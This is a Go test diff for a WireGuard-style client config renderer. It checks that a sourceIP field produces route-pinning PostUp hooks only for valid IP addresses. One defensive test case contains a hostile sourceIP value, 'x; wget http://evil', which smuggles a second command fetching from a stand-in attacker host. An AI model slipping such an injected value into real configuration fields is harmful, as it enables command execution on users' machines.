@@ -137,6 +137,46 @@ func TestRenderClientConf_I1StripsNewline(t *testing.T) {
 	}
 }
 
+func TestRenderClientConf_SourceIP(t *testing.T) {
+	v4 := &model.AwgOutbound{Id: 2, Settings: `{"privateKey":"k","address":"10.9.0.5/32","publicKey":"pub","endpoint":"203.0.113.7:51820","sourceIP":"198.51.100.9"}`}
+	conf := renderClientConf(mustClientInstance(t, v4))
+	if !strings.Contains(conf, "PostUp = ip -4 route replace 203.0.113.7/32 dev %i src 198.51.100.9") {
+		t.Fatalf("v4 source pin missing:\n%s", conf)
+	}
+	v6 := &model.AwgOutbound{Id: 3, Settings: `{"privateKey":"k","address":"fd00::5/128","publicKey":"pub","endpoint":"[2606:4700::1111]:51820","sourceIP":"fd00::9"}`}
+	conf = renderClientConf(mustClientInstance(t, v6))
+	if !strings.Contains(conf, "PostUp = ip -6 route replace 2606:4700::1111/128 dev %i src fd00::9") {
+		t.Fatalf("v6 source pin missing:\n%s", conf)
+	}
+	// No SourceIP (every existing row) → byte-identical .conf, no hooks ever.
+	plain := &model.AwgOutbound{Id: 4, Settings: `{"privateKey":"k","address":"10.9.0.5/32","publicKey":"pub","endpoint":"203.0.113.7:51820"}`}
+	conf = renderClientConf(mustClientInstance(t, plain))
+	if strings.Contains(conf, "PostUp") {
+		t.Fatalf("empty sourceIP must not render hooks:\n%s", conf)
+	}
+	// A hostile sourceIP from a pasted payload cannot reach the hook line.
+	hostile := &model.AwgOutbound{Id: 5, Settings: `{"privateKey":"k","address":"10.9.0.5/32","publicKey":"pub","endpoint":"203.0.113.7:51820","sourceIP":"x; wget http://evil"}`}
+	conf = renderClientConf(mustClientInstance(t, hostile))
+	if strings.Contains(conf, "PostUp") || strings.Contains(conf, "wget") {
+		t.Fatalf("non-IP sourceIP must not render hooks:\n%s", conf)
+	}
+	// Hostname endpoint: no pin (save rejects the combination, renderer stays inert).
+	host := &model.AwgOutbound{Id: 6, Settings: `{"privateKey":"k","address":"10.9.0.5/32","publicKey":"pub","endpoint":"awg.example.com:51820","sourceIP":"198.51.100.9"}`}
+	conf = renderClientConf(mustClientInstance(t, host))
+	if strings.Contains(conf, "PostUp") {
+		t.Fatalf("hostname endpoint must not render hooks:\n%s", conf)
+	}
+}
+
+func mustClientInstance(t *testing.T, o *model.AwgOutbound) ClientInstance {
+	t.Helper()
+	ci, ok := ClientInstanceFromOutbound(o)
+	if !ok {
+		t.Fatalf("ClientInstanceFromOutbound(%s)", o.Settings)
+	}
+	return ci
+}
+
 func TestRenderClientConf_I1toI5Written(t *testing.T) {
 	o := &model.AwgOutbound{Id: 1, Settings: `{"privateKey":"k","address":"10.9.0.5/32","publicKey":"pub","endpoint":"up:51820","i1":"aa","i2":"bb","i3":"cc","i4":"dd","i5":"ee"}`}
 	ci, _ := ClientInstanceFromOutbound(o)
